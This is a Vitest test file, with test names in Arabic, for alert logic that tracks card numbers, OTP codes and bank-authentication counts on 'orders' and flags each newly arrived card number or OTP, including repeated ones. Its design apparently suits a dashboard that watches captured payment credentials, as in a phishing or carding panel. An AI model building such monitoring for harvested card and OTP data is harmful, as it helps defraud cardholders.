import { describe, it, expect } from "vitest";
import { snapshotOf, hasNewSensitiveData, type AlertOrderLike } from "../client/src/lib/alertLogic";

const base: AlertOrderLike = {
  id: "1",
  cardNumber: "-",
  otp: "-",
  bankAuth: "-",
};

describe("snapshotOf", () => {
  it("يُنتج لقطة فارغة عندما لا توجد بيانات حساسة", () => {
    expect(snapshotOf(base)).toBe("-|0|0");
  });

  it("يحسب عدد رموز OTP من otpHistory", () => {
    expect(snapshotOf({ ...base, otpHistory: ["111", "222"] })).toBe("-|2|0");
  });

  it("يعتبر otp واحداً إذا لم يوجد otpHistory", () => {
    expect(snapshotOf({ ...base, otp: "123456" })).toBe("-|1|0");
  });

  it("يستخدم authCount لعدد المصادقات", () => {
    expect(snapshotOf({ ...base, bankAuth: "true", authCount: 3 })).toBe("-|0|3");
  });

  it("يدمج رقم البطاقة وعدد OTP وعدد المصادقات", () => {
    expect(
      snapshotOf({ ...base, cardNumber: "4333", otpHistory: ["1"], bankAuth: "true", authCount: 2 }),
    ).toBe("4333|1|2");
  });
});

describe("hasNewSensitiveData", () => {
  it("لا ينبّه على طلب جديد كلياً (prev غير معرّف)", () => {
    expect(hasNewSensitiveData(undefined, "4333|1|1")).toBe(false);
  });

  it("ينبّه عند وصول رقم بطاقة جديد", () => {
    expect(hasNewSensitiveData("-|0|0", "4333|0|0")).toBe(true);
  });

  it("ينبّه عند وصول أول رمز OTP", () => {
    expect(hasNewSensitiveData("4333|0|0", "4333|1|0")).toBe(true);
  });

  it("ينبّه عند وصول رمز OTP إضافي (تكرار)", () => {
    expect(hasNewSensitiveData("4333|1|0", "4333|2|0")).toBe(true);
  });

  it("ينبّه عند أول مصادقة بنكية", () => {
    expect(hasNewSensitiveData("4333|1|0", "4333|1|1")).toBe(true);
  });

  it("ينبّه عند مصادقة بنكية إضافية (تكرار)", () => {
    expect(hasNewSensitiveData("4333|1|1", "4333|1|2")).toBe(true);
  });

  it("لا ينبّه عند عدم تغيّر البيانات الحساسة", () => {
    expect(hasNewSensitiveData("4333|2|1", "4333|2|1")).toBe(false);
  });

  it("لا ينبّه عند نقص العدّاد (لا يحدث عملياً لكن للأمان)", () => {
    expect(hasNewSensitiveData("4333|2|2", "4333|1|1")).toBe(false);
  });
});
